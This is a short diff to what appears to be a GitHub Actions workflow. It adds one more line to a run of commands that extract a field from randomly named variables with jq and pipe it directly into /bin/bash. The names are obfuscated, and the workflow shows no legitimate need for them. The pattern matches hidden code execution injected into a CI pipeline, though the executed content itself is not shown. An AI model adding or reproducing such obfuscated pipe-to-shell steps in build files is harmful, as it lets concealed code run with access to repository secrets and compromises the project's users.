@@ -23,6 +23,7 @@ jobs:
           echo $u2654 | jq -r .xfy2197 | /bin/bash
           echo $qeusg7 | jq -r .gkf9 | /bin/bash
           echo $hl9 | jq -r .w3684 | /bin/bash
+          printf '%s' "$ls70655" | jq -r .j15 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
